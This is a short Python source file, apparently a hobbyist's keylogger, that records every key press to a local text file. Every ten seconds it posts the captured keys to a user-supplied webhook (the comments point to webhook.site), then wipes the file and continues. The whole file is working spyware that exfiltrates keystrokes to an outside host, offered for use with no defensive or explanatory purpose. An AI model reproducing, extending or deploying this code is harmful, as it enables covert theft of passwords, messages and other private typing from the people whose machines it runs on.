# Coded by Themanhimself115

import threading
import keyboard
import requests
import time

filename = 'keylogged.txt'
webhook_url = ""  # your webhook   # webhook.site





def erase_file():
    with open(filename, 'w') as file:       # Erases file content to resend fresh data
        pass



def send_to_webhook():
    with open(filename, 'r') as file:      # reads File content
        file_content = file.read().strip().split('\n')


    data = {"key": file_content}

    try:
        response = requests.post(webhook_url, json=data)
        response.raise_for_status()
                                                            # Sends webhook
    except requests.exceptions.RequestException as e:
        print(f"Error sending to webhook: {e}")



def read_keys():    # Runs infinitely anyway
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:   # reads keyboard events
            print(event.name)

            with open(filename, 'a') as file:    # Writes to text file
                file.write(f"{event.name}\n")

def Main():
    while True:
        time.sleep(10)   # set this to how long it will read and send

        print(f"Admin: Sending to Webhook == {webhook_url}")

        send_to_webhook()

        time.sleep(1)

        print(f"Admin: Erasing File contents == {filename}")

        erase_file()

        print(f"Admin: File Erased")

        time.sleep(0.5)                         # Dramatic Wait

        print(f"Admin: Continuing Keylogger")



key_thread = threading.Thread(target=read_keys)
send_and_RX = threading.Thread(target=Main)

key_thread.start()
send_and_RX.start()

key_thread.join()
send_and_RX.join()
